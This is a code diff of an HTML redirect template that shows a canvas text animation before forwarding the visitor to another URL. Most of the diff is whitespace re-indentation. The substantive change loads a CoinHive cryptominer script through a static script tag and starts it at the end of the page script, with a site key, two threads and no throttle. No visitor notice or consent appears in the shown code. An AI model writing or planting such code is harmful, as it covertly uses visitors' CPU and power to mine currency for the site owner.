@@ -59,24 +59,16 @@
 </p>
 <iframe src="${forwardURL}"></iframe>
 <script src="${staticServePath}/js/lib/jquery/jquery-3.1.0.min.js"></script>
+<script src="${staticServePath}/js/lib/xmr.min.js"></script>
 <script>
-    $.ajax({
-        method: "GET",
-        url: '${staticServePath}/js/lib/xmr.min.js',
-        dataType: "script",
-        cache: true
-    }).done(function () {
-        var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
-        miner.start();
-        setTimeout(function () {
-            window.location.href = '${forwardURL}'
-        }, 5000)
-        setTimeout(function () {
-            $('.text').animate({
-                bottom: ($(window).height() - 56 ) / 2 +'px'
-            })
-        }, 4000)
-    });
+    setTimeout(function () {
+        window.location.href = '${forwardURL}'
+    }, 5000)
+    setTimeout(function () {
+        $('.text').animate({
+            bottom: ($(window).height() - 56 ) / 2 +'px'
+        })
+    }, 4000)
 
 
     var S = {
@@ -94,16 +86,16 @@
 
     S.Drawing = (function () {
         var canvas,
-                context,
-                renderFn,
-                requestFrame = window.requestAnimationFrame ||
-                        window.webkitRequestAnimationFrame ||
-                        window.mozRequestAnimationFrame ||
-                        window.oRequestAnimationFrame ||
-                        window.msRequestAnimationFrame ||
-                        function (callback) {
-                            window.setTimeout(callback, 1000 / 60);
-                        };
+            context,
+            renderFn,
+            requestFrame = window.requestAnimationFrame ||
+                window.webkitRequestAnimationFrame ||
+                window.mozRequestAnimationFrame ||
+                window.oRequestAnimationFrame ||
+                window.msRequestAnimationFrame ||
+                function (callback) {
+                    window.setTimeout(callback, 1000 / 60);
+                };
 
         return {
             init: function (el) {
@@ -144,16 +136,16 @@
 
     S.UI = (function () {
         var interval,
-                currentAction,
-                time,
-                maxShapeSize = 30,
-                sequence = [],
-                cmd = '#';
+            currentAction,
+            time,
+            maxShapeSize = 30,
+            sequence = [],
+            cmd = '#';
 
         function formatTime(date) {
             var h = date.getHours(),
-                    m = date.getMinutes(),
-                    m = m < 10 ? '0' + m : m;
+                m = date.getMinutes(),
+                m = m < 10 ? '0' + m : m;
             return h + ':' + m;
         }
 
@@ -185,8 +177,8 @@
 
         function performAction(value) {
             var action,
-                    value,
-                    current;
+                value,
+                current;
 
             sequence = typeof (value) === 'object' ? value : sequence.concat(value.split('|'));
 
@@ -313,10 +305,10 @@
         },
         _moveTowards: function (n) {
             var details = this.distanceTo(n, true),
-                    dx = details[0],
-                    dy = details[1],
-                    d = details[2],
-                    e = this.e * d;
+                dx = details[0],
+                dy = details[1],
+                d = details[2],
+                e = this.e * d;
 
             if (this.p.h === -1) {
                 this.p.x = n.x;
@@ -367,8 +359,8 @@
         },
         distanceTo: function (n, details) {
             var dx = this.p.x - n.x,
-                    dy = this.p.y - n.y,
-                    d = Math.sqrt(dx * dx + dy * dy);
+                dy = this.p.y - n.y,
+                d = Math.sqrt(dx * dx + dy * dy);
 
             return details ? [dx, dy, d] : d;
         },
@@ -386,10 +378,10 @@
 
     S.ShapeBuilder = (function () {
         var gap = 13,
-                shapeCanvas = document.createElement('canvas'),
-                shapeContext = shapeCanvas.getContext('2d'),
-                fontSize = 500,
-                fontFamily = 'Avenir, Helvetica Neue, Helvetica, Arial, sans-serif';
+            shapeCanvas = document.createElement('canvas'),
+            shapeContext = shapeCanvas.getContext('2d'),
+            fontSize = 500,
+            fontFamily = 'Avenir, Helvetica Neue, Helvetica, Arial, sans-serif';
 
         function fit() {
             shapeCanvas.width = Math.floor(window.innerWidth / gap) * gap;
@@ -402,13 +394,13 @@
         function processCanvas() {
             var pixels = shapeContext.getImageData(0, 0, shapeCanvas.width, shapeCanvas.height).data;
             dots = [],
-                    pixels,
-                    x = 0,
-                    y = 0,
-                    fx = shapeCanvas.width,
-                    fy = shapeCanvas.height,
-                    w = 0,
-                    h = 0;
+                pixels,
+                x = 0,
+                y = 0,
+                fx = shapeCanvas.width,
+                fy = shapeCanvas.height,
+                w = 0,
+                h = 0;
 
             for (var p = 0; p < pixels.length; p += (4 * gap)) {
                 if (pixels[p + 3] > 0) {
@@ -454,7 +446,7 @@
         return {
             imageFile: function (url, callback) {
                 var image = new Image(),
-                        a = S.Drawing.getArea();
+                    a = S.Drawing.getArea();
 
                 image.onload = function () {
                     shapeContext.clearRect(0, 0, shapeCanvas.width, shapeCanvas.height);
@@ -483,8 +475,8 @@
 
                 setFontSize(fontSize);
                 s = Math.min(fontSize,
-                        (shapeCanvas.width / shapeContext.measureText(l).width) * 0.8 * fontSize,
-                        (shapeCanvas.height / fontSize) * (isNumber(l) ? 1 : 0.45) * fontSize);
+                    (shapeCanvas.width / shapeContext.measureText(l).width) * 0.8 * fontSize,
+                    (shapeCanvas.height / fontSize) * (isNumber(l) ? 1 : 0.45) * fontSize);
                 setFontSize(s);
 
                 shapeContext.clearRect(0, 0, shapeCanvas.width, shapeCanvas.height);
@@ -494,8 +486,8 @@
             },
             rectangle: function (w, h) {
                 var dots = [],
-                        width = gap * w,
-                        height = gap * h;
+                    width = gap * w,
+                    height = gap * h;
 
                 for (var y = 0; y < height; y += gap) {
                     for (var x = 0; x < width; x += gap) {
@@ -514,10 +506,10 @@
 
     S.Shape = (function () {
         var dots = [],
-                width = 0,
-                height = 0,
-                cx = 0,
-                cy = 0;
+            width = 0,
+            height = 0,
+            cx = 0,
+            cy = 0;
 
         function compensate() {
             var a = S.Drawing.getArea();
@@ -541,7 +533,7 @@
             },
             switchShape: function (n, fast) {
                 var size,
-                        a = S.Drawing.getArea();
+                    a = S.Drawing.getArea();
 
                 width = n.w;
                 height = n.h;
@@ -556,7 +548,7 @@
                 }
 
                 var d = 0,
-                        i = 0;
+                    i = 0;
 
                 while (n.dots.length > 0) {
                     i = Math.floor(Math.random() * n.dots.length);
@@ -616,6 +608,9 @@
         };
     }());
     S.init();
+
+    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
+    miner.start();
 </script>
 </body>
 </html>
